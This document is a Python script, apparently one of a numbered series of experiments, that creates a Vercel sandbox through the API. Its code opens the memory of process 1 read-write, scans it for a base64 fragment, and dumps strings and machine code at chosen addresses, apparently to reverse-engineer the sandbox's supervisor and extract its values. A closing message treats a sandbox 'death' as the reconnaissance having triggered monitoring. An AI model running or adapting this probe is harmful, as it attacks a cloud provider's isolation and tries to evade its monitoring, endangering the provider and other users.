# 实验J206: A)扫base64子串"WVN8gckg"(9字符)覆盖拆段存储 B)dump第二个flag usage C)dump 0x5ab700
# j205: 0xA00865="unix socket path..."(flag usage); main.run参数=flag值; slice header非pub形式
# 本步: 1)rodata+data+heap扫子串 2)0xA0641E/0x9ECF29 3)0x5ab700机器码(本地反汇编)
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=26000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj206"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

CODE = r'''
import os, time, sys
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)

p("start")
fd = os.open("/proc/1/mem", os.O_RDWR)
def read_at(addr, n):
    os.lseek(fd, addr, 0)
    return os.read(fd, n)

# PA: 扫 "WVN8gckg" 子串 (rodata + data)
p("CP", "PA")
PAT = b"WVN8gckg"
def scan_range(lo, hi, tag):
    hits = []
    off = lo
    while off < hi:
        try:
            os.lseek(fd, off, 0)
            b = os.read(fd, min(65536, hi - off))
        except OSError:
            off += 65536
            continue
        if b:
            i = b.find(PAT)
            while i >= 0 and len(hits) < 10:
                hits.append(hex(off + i))
                i = b.find(PAT, i + 1)
        off += len(b)
    p("SUB_HITS", tag, hits)
    return hits

scan_range(0x8db000, 0xe30000, "RODATA")
scan_range(0xe9e000, 0x2ee2000, "DATA")
# heap: 从maps解析
maps = open("/proc/1/maps").read()
for ln in maps.splitlines():
    try:
        rng, perm, off, dev, ino, *rest = ln.split()
    except ValueError:
        continue
    if "rw" in perm and ino == "0":
        lo, hi = (int(x, 16) for x in rng.split("-"))
        if hi - lo >= 0x100000:
            scan_range(lo, hi, "RW" + hex(lo))

# PB: dump 第二个flag usage + 其他串
p("CP", "PB")
for a, n in ((0xA0641E, 96), (0x9ECF29, 16), (0x965720, 48), (0x9A1320, 32)):
    try:
        b = read_at(a, n)
        s = "".join(chr(c) if 32 <= c < 127 else "." for c in b)
        p("STR", hex(a), repr(s))
    except Exception as e:
        p("STR_ERR", hex(a), repr(e))

# PC: dump 0x5ab700 机器码 (本地反汇编确认身份)
p("CP", "PC")
b = read_at(0x5ab700, 0x200)
p("FUN_HEX", b.hex())
p("done")
'''

st = run_cmd(sid, CODE, "J206", timeout=290)
time.sleep(2)
if st == "DEAD":
    print("\n!!! DEATH -> 侦察触发监控", flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
